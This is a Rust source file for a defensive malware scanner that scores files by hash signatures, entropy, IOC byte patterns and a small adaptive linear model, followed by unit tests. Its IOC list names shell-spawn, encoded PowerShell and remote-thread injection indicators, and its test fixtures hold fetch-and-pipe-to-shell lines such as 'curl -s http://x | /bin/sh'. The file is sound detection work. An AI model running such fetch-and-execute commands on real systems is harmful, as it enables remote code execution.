//! flux-sentinel — a *sentient* (adaptive-heuristic) defensive scanner for the Flux/SIGIL fleet.
//!
//! Purely defensive: it **detects, scores, and quarantines** — it never hides or evades anything.
//! Three layers feed one verdict:
//!   1. **Signatures** — BLAKE3 content hashes of known-bad artifacts (exact match → malicious).
//!   2. **Heuristics** — measurable features: Shannon entropy (packed/encrypted payloads),
//!      IOC byte-patterns (shellcode/loader/exfil indicators), size anomalies.
//!   3. **Adaptive model** — a small online linear scorer over those features. `learn()` nudges the
//!      feature weights toward observed labels (perceptron-style), so the sentinel *improves with
//!      feedback* — the honest meaning of "sentient" here: adaptive, not conscious.
//!
//! Verdict = sigmoid(weights · features) → Clean / Suspicious / Malicious, with the reasons that
//! drove it. Quarantine is a record, not a deletion — nothing is destroyed silently.

use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;

/// IOC byte-patterns a defensive scanner flags. Detection indicators, not offensive code.
const IOCS: &[(&str, &[u8])] = &[
    ("unix-shell-spawn", b"/bin/sh"),
    ("dyn-eval", b"eval("),
    ("win-remote-thread", b"CreateRemoteThread"),
    ("win-alloc-ex", b"VirtualAllocEx"),
    ("ps-encoded", b"powershell -enc"),
    ("reflective-load", b"ReflectiveLoader"),
    ("curl-pipe-sh", b"curl -s"),
    ("base64-decode-exec", b"base64 -d"),
];

/// The genesis provenance stamp for this build — `stamp().line()` is the verified one-liner.
pub fn stamp() -> flux_stamp::Stamp { flux_stamp::flux_stamp!() }

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum Level {
    Clean,
    Suspicious,
    Malicious,
}

/// A scan verdict: the level, the model score (0..1), and the human-readable reasons.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Verdict {
    pub name: String,
    pub level: Level,
    pub score: f64,
    pub confidence: f64,
    pub reasons: Vec<String>,
    pub sha: String,
}

/// Extracted features (all normalised ~0..1) — the input to the adaptive model.
#[derive(Debug, Clone, Default)]
struct Features {
    entropy: f64,      // Shannon entropy / 8.0
    ioc_density: f64,  // matched IOCs / total IOCs
    size_anomaly: f64, // tiny binaries-with-IOCs heuristic
    nonprint: f64,     // fraction of non-printable bytes
}

impl Features {
    fn vec(&self) -> [f64; 4] {
        [self.entropy, self.ioc_density, self.size_anomaly, self.nonprint]
    }
}

/// Shannon entropy in bits/byte (0..8).
fn shannon_entropy(data: &[u8]) -> f64 {
    if data.is_empty() {
        return 0.0;
    }
    let mut counts = [0u64; 256];
    for &b in data {
        counts[b as usize] += 1;
    }
    let len = data.len() as f64;
    let mut h = 0.0;
    for &c in counts.iter() {
        if c > 0 {
            let p = c as f64 / len;
            h -= p * p.log2();
        }
    }
    h
}

fn sigmoid(x: f64) -> f64 {
    1.0 / (1.0 + (-x).exp())
}

/// The sentinel engine: signature DB, learnable weights, quarantine ledger.
#[derive(Serialize, Deserialize)]
pub struct Sentinel {
    signatures: BTreeMap<String, String>, // blake3 hex -> label
    weights: [f64; 4],
    bias: f64,
    quarantine: Vec<Verdict>,
    #[serde(default)]
    trained: u64,
}

impl Default for Sentinel {
    fn default() -> Self {
        Self::new()
    }
}

impl Sentinel {
    /// A sentinel with sensible starting weights (entropy + IOC density dominate).
    pub fn new() -> Self {
        Sentinel {
            signatures: BTreeMap::new(),
            weights: [3.2, 5.0, 1.4, 1.1],
            bias: -3.0,
            quarantine: Vec::new(),
            trained: 0,
        }
    }

    /// Register a known-bad artifact by its bytes (exact hash → always malicious).
    pub fn add_signature(&mut self, bad_bytes: &[u8], label: &str) {
        let sha = blake3::hash(bad_bytes).to_hex().to_string();
        self.signatures.insert(sha, label.to_string());
    }

    fn extract(&self, data: &[u8]) -> (Features, Vec<String>) {
        let mut reasons = Vec::new();
        let entropy = shannon_entropy(data) / 8.0;
        if entropy > 0.92 {
            reasons.push(format!("high entropy {:.2} bits/byte (packed/encrypted)", entropy * 8.0));
        }
        let mut hits = 0usize;
        for (name, pat) in IOCS {
            if data.windows(pat.len()).any(|w| w == *pat) {
                hits += 1;
                reasons.push(format!("IOC: {}", name));
            }
        }
        let ioc_density = hits as f64 / IOCS.len() as f64;
        let nonprint = if data.is_empty() {
            0.0
        } else {
            data.iter().filter(|&&b| b < 9 || (b > 13 && b < 32)).count() as f64 / data.len() as f64
        };
        // small payload carrying IOCs is more suspicious (dropper/loader shape)
        let size_anomaly = if hits > 0 && data.len() < 4096 { 1.0 } else { 0.0 };
        (Features { entropy, ioc_density, size_anomaly, nonprint }, reasons)
    }

    fn model_score(&self, f: &Features) -> f64 {
        let v = f.vec();
        let mut z = self.bias;
        for i in 0..4 {
            z += self.weights[i] * v[i];
        }
        sigmoid(z)
    }

    /// Scan a buffer. Signature match short-circuits to Malicious; otherwise the model decides.
    pub fn scan(&self, name: &str, data: &[u8]) -> Verdict {
        let sha = blake3::hash(data).to_hex().to_string();
        if let Some(label) = self.signatures.get(&sha) {
            return Verdict {
                name: name.into(),
                level: Level::Malicious,
                score: 1.0,
                confidence: 1.0,
                reasons: vec![format!("signature match: {}", label)],
                sha,
            };
        }
        let (f, reasons) = self.extract(data);
        let score = self.model_score(&f);
        let level = if score >= 0.75 {
            Level::Malicious
        } else if score >= 0.4 {
            Level::Suspicious
        } else {
            Level::Clean
        };
        // confidence = distance from the nearest decision boundary
        let confidence = (2.0 * (score - 0.5).abs()).min(1.0);
        Verdict { name: name.into(), level, score, confidence, reasons, sha }
    }

    /// Scan and, if not Clean, record it in the quarantine ledger. Returns the verdict.
    pub fn scan_and_quarantine(&mut self, name: &str, data: &[u8]) -> Verdict {
        let v = self.scan(name, data);
        if v.level != Level::Clean {
            self.quarantine.push(v.clone());
        }
        v
    }

    /// Online learning: nudge the weights toward an observed label (1.0 = malicious, 0.0 = clean).
    /// This is what makes the sentinel adaptive — feedback improves future verdicts.
    pub fn learn(&mut self, data: &[u8], malicious: bool) {
        let (f, _) = self.extract(data);
        let target = if malicious { 1.0 } else { 0.0 };
        let pred = self.model_score(&f);
        let err = target - pred;
        let lr = 0.5;
        let v = f.vec();
        for i in 0..4 {
            self.weights[i] += lr * err * v[i];
        }
        self.bias += lr * err;
        self.trained += 1;
    }

    pub fn quarantine_log(&self) -> &[Verdict] {
        &self.quarantine
    }

    pub fn to_json(&self) -> String {
        serde_json::to_string(self).unwrap_or_default()
    }

    pub fn from_json(s: &str) -> Option<Self> {
        serde_json::from_str(s).ok()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn clean_text_is_clean() {
        let s = Sentinel::new();
        let v = s.scan("notes.txt", b"the quick brown fox jumps over the lazy dog, repeatedly and calmly.");
        assert_eq!(v.level, Level::Clean, "score={}", v.score);
    }

    #[test]
    fn signature_match_is_malicious() {
        let mut s = Sentinel::new();
        let bad = b"this exact artifact is known bad";
        s.add_signature(bad, "EICAR-like-test");
        let v = s.scan("dropper.bin", bad);
        assert_eq!(v.level, Level::Malicious);
        assert_eq!(v.confidence, 1.0);
        assert!(v.reasons[0].contains("signature match"));
    }

    #[test]
    fn ioc_patterns_raise_suspicion() {
        let s = Sentinel::new();
        // a small payload carrying multiple loader/exec indicators
        let mut buf = Vec::new();
        buf.extend_from_slice(b"loader: VirtualAllocEx + CreateRemoteThread; then curl -s http://x | /bin/sh");
        let v = s.scan("loader.bin", &buf);
        assert_ne!(v.level, Level::Clean, "score={} reasons={:?}", v.score, v.reasons);
        assert!(v.reasons.iter().any(|r| r.contains("IOC")));
    }

    #[test]
    fn high_entropy_is_flagged_in_reasons() {
        let s = Sentinel::new();
        // genuinely high-entropy buffer (blake3 XOF ≈ uniform bytes ≈ 8 bits/byte)
        let mut data = vec![0u8; 4096];
        blake3::Hasher::new().update(b"high-entropy-seed").finalize_xof().fill(&mut data);
        let (_f, reasons) = {
            let v = s.scan("packed.bin", &data);
            (v.score, v.reasons)
        };
        assert!(reasons.iter().any(|r| r.contains("entropy")), "reasons={:?}", reasons);
    }

    #[test]
    fn learning_increases_malicious_score() {
        let mut s = Sentinel::new();
        let sample = b"eval( VirtualAllocEx CreateRemoteThread ReflectiveLoader )";
        let before = s.scan("x", sample).score;
        for _ in 0..20 {
            s.learn(sample, true);
        }
        let after = s.scan("x", sample).score;
        assert!(after > before, "before={} after={}", before, after);
        assert!(s.trained == 20);
    }

    #[test]
    fn quarantine_records_non_clean() {
        let mut s = Sentinel::new();
        s.scan_and_quarantine("clean.txt", b"hello world hello world hello world");
        s.scan_and_quarantine("bad.bin", b"VirtualAllocEx CreateRemoteThread curl -s | /bin/sh eval(");
        // only the non-clean one is quarantined
        assert!(s.quarantine_log().iter().all(|v| v.level != Level::Clean));
        assert!(!s.quarantine_log().is_empty());
    }

    #[test]
    fn persistence_roundtrip() {
        let mut s = Sentinel::new();
        s.add_signature(b"bad", "x");
        s.learn(b"eval( /bin/sh", true);
        let json = s.to_json();
        let s2 = Sentinel::from_json(&json).unwrap();
        assert_eq!(s2.scan("y", b"bad").level, Level::Malicious);
    }
}
